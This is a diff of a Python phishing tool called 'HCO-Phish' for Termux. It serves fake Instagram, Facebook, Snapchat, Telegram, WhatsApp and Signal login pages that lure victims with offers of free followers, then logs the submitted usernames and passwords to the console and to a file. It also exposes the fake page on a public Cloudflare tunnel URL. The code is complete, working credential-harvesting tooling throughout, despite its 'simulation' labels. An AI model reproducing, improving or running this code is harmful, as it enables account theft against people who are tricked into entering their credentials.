@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-# HCO-Phish v8 – Full Working Version
-# Single-file Termux Tool
+# HCO-Phish – Single Service Realistic Dashboard with Colorful Branding
 
 import os, sys, time, subprocess, threading, webbrowser, shutil, re
 from colorama import Fore, init
@@ -23,59 +22,56 @@ def check_subscription():
     input(Fore.GREEN + "Press Enter after subscribing to continue...")
 
 # ------------------ Termux Menu ------------------ #
-def show_menu():
-    print(Fore.CYAN + "="*60)
-    print(Fore.MAGENTA + "MENU — choose a template (enter number):")
-    print(Fore.YELLOW + "1) 📷  Instagram")
-    print(Fore.BLUE + "2) 📘  Facebook")
-    print(Fore.LIGHTMAGENTA_EX + "3) 👻  Snapchat")
-    print(Fore.LIGHTCYAN_EX + "4) ✈️  Telegram")
-    print(Fore.LIGHTGREEN_EX + "5) 💬  WhatsApp")
-    print(Fore.LIGHTBLUE_EX + "6) 🔵  Signal")
-    print(Fore.RED + "0) Exit")
-    print(Fore.CYAN + "="*60)
-
-choice=None
-while choice not in ["0","1","2","3","4","5","6"]:
-    show_menu()
-    choice=input(Fore.GREEN + "Select (0-6): ").strip()
-
-if choice=="0":
-    print(Fore.RED + "[!] Exiting...")
-    sys.exit()
-
-services={
-    "1":"Instagram",
-    "2":"Facebook",
-    "3":"Snapchat",
-    "4":"Telegram",
-    "5":"WhatsApp",
-    "6":"Signal"
+services=["Instagram","Facebook","Snapchat","Telegram","WhatsApp","Signal"]
+colors={
+    "Instagram":"#405DE6",
+    "Facebook":"#1877f2",
+    "Snapchat":"#fffc00",
+    "Telegram":"#0088cc",
+    "WhatsApp":"#25d366",
+    "Signal":"#3a76f0"
 }
 
-selected_service=services[choice]
+choice=None
+while choice not in [str(i) for i in range(1,len(services)+1)]:
+    print(Fore.CYAN+"="*60)
+    print(Fore.MAGENTA+"MENU — choose a template (enter number):")
+    for idx,s in enumerate(services,1):
+        print(Fore.YELLOW+f"{idx}) {s}")
+    print(Fore.RED+"0) Exit")
+    print(Fore.CYAN+"="*60)
+    choice=input(Fore.GREEN+"Select (1-6): ").strip()
+    if choice=="0": sys.exit(Fore.RED+"[!] Exiting...")
+
+selected_service=services[int(choice)-1]
+selected_color=colors[selected_service]
 print(Fore.LIGHTMAGENTA_EX + f"[*] You selected: {selected_service}")
 
-# ------------------ Tool Lock ------------------ #
 check_subscription()
 print(Fore.CYAN + "[*] Starting local Flask server...")
 
 # ------------------ Flask App ------------------ #
-app = Flask(__name__)
+app=Flask(__name__)
 
-# ------------------ HTML Templates ------------------ #
-templates = {
-"Instagram": """<html><head><title>Instagram</title>
+# ------------------ HTML Template ------------------ #
+dashboard_html=f"""
+<!DOCTYPE html>
+<html>
+<head>
+<title>{selected_service} Login</title>
 <style>
-body{background:#fafafa;font-family:Arial;text-align:center;}
-.login-box{background:#f0f0f0;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
-h1{color:#405DE6;font-size:28px;margin-bottom:15px;}
-input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
-button{padding:10px 20px;background:#405DE6;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
-</style></head>
+body{{background:{selected_color};color:white;font-family:Arial;text-align:center;margin:0;padding:0;}}
+header{{background:#0d47a1;color:red;font-size:36px;font-weight:bold;padding:25px;}}
+input{{padding:10px;margin:5px;width:250px;border-radius:5px;border:none;font-size:16px;}}
+select{{padding:10px;margin:5px;width:266px;border-radius:5px;border:none;font-size:16px;background:{selected_color};color:white;}}
+button{{padding:10px;margin:5px;width:266px;border-radius:5px;border:none;font-size:16px;background:{selected_color};color:white;font-weight:bold;cursor:pointer;}}
+button:hover{{opacity:0.9;}}
+h1{{margin-top:30px;}}
+</style>
+</head>
 <body>
-<div class="login-box">
-<h1>Instagram Login</h1>
+<header>HCO Phish by Azhar</header>
+<h1>{selected_service} Login</h1>
 <form method="POST">
 <select name="followers" required>
 <option value="" disabled selected>Select followers</option>
@@ -83,175 +79,49 @@ button{padding:10px 20px;background:#405DE6;color:white;border:none;border-radiu
 <option value="1000">1000 followers</option>
 <option value="10000">10000 followers</option>
 </select><br>
-<input type="text" name="username" placeholder="Username" required><br>
+<input type="text" name="username" placeholder="Username or Phone" required><br>
 <input type="password" name="password" placeholder="Password" required><br>
-<button type="submit">Log In</button>
+<button type="submit">Login</button>
 </form>
-</div>
-</body></html>""",
-"Facebook": """<html><head><title>Facebook</title>
-<style>
-body{background:#e9ebee;font-family:Arial;text-align:center;}
-.login-box{background:#fff;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
-h1{color:#1877f2;font-size:28px;margin-bottom:15px;}
-input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
-button{padding:10px 20px;background:#1877f2;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
-</style></head>
-<body>
-<div class="login-box">
-<h1>Facebook Login</h1>
-<form method="POST">
-<select name="followers" required>
-<option value="" disabled selected>Select followers</option>
-<option value="100">100 followers</option>
-<option value="1000">1000 followers</option>
-<option value="10000">10000 followers</option>
-</select><br>
-<input type="text" name="username" placeholder="Email or Phone" required><br>
-<input type="password" name="password" placeholder="Password" required><br>
-<button type="submit">Log In</button>
-</form>
-</div>
-</body></html>""",
-"Snapchat": """<html><head><title>Snapchat</title>
-<style>
-body{background:#fffc00;font-family:Arial;text-align:center;}
-.login-box{background:#fff;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
-h1{color:#fffc00;font-size:28px;margin-bottom:15px;}
-input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
-button{padding:10px 20px;background:#fffc00;color:#000;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
-</style></head>
-<body>
-<div class="login-box">
-<h1>Snapchat Login</h1>
-<form method="POST">
-<select name="followers" required>
-<option value="" disabled selected>Select followers</option>
-<option value="100">100 followers</option>
-<option value="1000">1000 followers</option>
-<option value="10000">10000 followers</option>
-</select><br>
-<input type="text" name="username" placeholder="Username" required><br>
-<input type="password" name="password" placeholder="Password" required><br>
-<button type="submit">Log In</button>
-</form>
-</div>
-</body></html>""",
-"Telegram": """<html><head><title>Telegram</title>
-<style>
-body{background:#0088cc;font-family:Arial;text-align:center;}
-.login-box{background:#f0f8ff;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
-h1{color:#0088cc;font-size:28px;margin-bottom:15px;}
-input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
-button{padding:10px 20px;background:#0088cc;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
-</style></head>
-<body>
-<div class="login-box">
-<h1>Telegram Login</h1>
-<form method="POST">
-<select name="followers" required>
-<option value="" disabled selected>Select followers</option>
-<option value="100">100 followers</option>
-<option value="1000">1000 followers</option>
-<option value="10000">10000 followers</option>
-</select><br>
-<input type="text" name="username" placeholder="Phone Number" required><br>
-<input type="password" name="password" placeholder="Password" required><br>
-<button type="submit">Log In</button>
-</form>
-</div>
-</body></html>""",
-"WhatsApp": """<html><head><title>WhatsApp</title>
-<style>
-body{background:#25d366;font-family:Arial;text-align:center;}
-.login-box{background:#e6ffe6;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
-h1{color:#25d366;font-size:28px;margin-bottom:15px;}
-input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
-button{padding:10px 20px;background:#25d366;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
-</style></head>
-<body>
-<div class="login-box">
-<h1>WhatsApp Login</h1>
-<form method="POST">
-<select name="followers" required>
-<option value="" disabled selected>Select followers</option>
-<option value="100">100 followers</option>
-<option value="1000">1000 followers</option>
-<option value="10000">10000 followers</option>
-</select><br>
-<input type="text" name="username" placeholder="Phone Number" required><br>
-<input type="password" name="password" placeholder="Password" required><br>
-<button type="submit">Log In</button>
-</form>
-</div>
-</body></html>""",
-"Signal": """<html><head><title>Signal</title>
-<style>
-body{background:#3a76f0;font-family:Arial;text-align:center;}
-.login-box{background:#e6f0ff;width:350px;margin:50px auto;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.3);}
-h1{color:#3a76f0;font-size:28px;margin-bottom:15px;}
-input,select{width:90%;padding:10px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;}
-button{padding:10px 20px;background:#3a76f0;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:16px;}
-</style></head>
-<body>
-<div class="login-box">
-<h1>Signal Login</h1>
-<form method="POST">
-<select name="followers" required>
-<option value="" disabled selected>Select followers</option>
-<option value="100">100 followers</option>
-<option value="1000">1000 followers</option>
-<option value="10000">10000 followers</option>
-</select><br>
-<input type="text" name="username" placeholder="Phone Number" required><br>
-<input type="password" name="password" placeholder="Password" required><br>
-<button type="submit">Log In</button>
-</form>
-</div>
-</body></html>"""
-}
+</body>
+</html>
+"""
 
-# ------------------ Flask Routes ------------------ #
-@app.route("/")
-def home_redirect():
-    return f"<script>window.location='/simulate/{selected_service.lower()}'</script>"
-
-@app.route(f"/simulate/{selected_service.lower()}", methods=["GET","POST"])
-def service_page():
+@app.route("/", methods=["GET","POST"])
+def dashboard():
     if request.method=="POST":
-        followers=request.form.get("followers","N/A")
         username=request.form.get("username","")
         password=request.form.get("password","")
-        print(Fore.LIGHTGREEN_EX + f"\n[+] {selected_service} Login Captured!")
-        print(Fore.CYAN + f"Followers Selected: {followers}")
-        print(Fore.YELLOW + f"Username: {username}")
-        print(Fore.RED + f"Password: {password}\n")
+        followers=request.form.get("followers","N/A")
+        print(Fore.LIGHTGREEN_EX+f"\n[+] {selected_service} Login Captured!")
+        print(Fore.CYAN+f"Followers Selected: {followers}")
+        print(Fore.YELLOW+f"Username: {username}")
+        print(Fore.RED+f"Password: {password}\n")
         with open("simulation_log.txt","a") as f:
             f.write(f"[{selected_service}] Followers:{followers} {username}:{password}\n")
-        return f"<h2>{selected_service} Login submitted successfully!</h2>"
-    return render_template_string(templates[selected_service])
+        return f"<h2>{selected_service} Login submitted successfully!</h2><a href='/'>Back</a>"
+    return render_template_string(dashboard_html)
 
 # ------------------ Cloudflare Tunnel ------------------ #
 def start_cloudflared():
     if shutil.which("cloudflared") is None:
-        print(Fore.RED + "[!] cloudflared not installed. Install manually using 'pkg install cloudflared'")
+        print(Fore.RED + "[!] cloudflared not installed. Install using 'pkg install cloudflared'")
         return
     print(Fore.CYAN + "[*] Starting cloudflared tunnel...")
     proc=subprocess.Popen(
         ["cloudflared","tunnel","--url","http://127.0.0.1:5000"],
         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
     )
-    public_url=None
     while True:
         line=proc.stdout.readline()
         if line:
-            print(Fore.LIGHTBLACK_EX + line.strip())
-            match=re.search(r"https://[a-zA-Z0-9.-]+trycloudflare\.com", line)
+            print(Fore.LIGHTBLACK_EX+line.strip())
+            match=re.search(r"https://[a-zA-Z0-9.-]+trycloudflare\.com",line)
             if match:
-                public_url=match.group(0)
-                print(Fore.LIGHTGREEN_EX + f"[*] Cloudflare Public URL: {public_url}/simulate/{selected_service.lower()}")
+                url=match.group(0)
+                print(Fore.LIGHTGREEN_EX + f"[*] Cloudflare Public URL: {url}")
                 break
 
-# ------------------ Run ------------------ #
+# ------------------ Run Flask ------------------ #
 threading.Thread(target=start_cloudflared, daemon=True).start()
 app.run(host="0.0.0.0", port=5000)
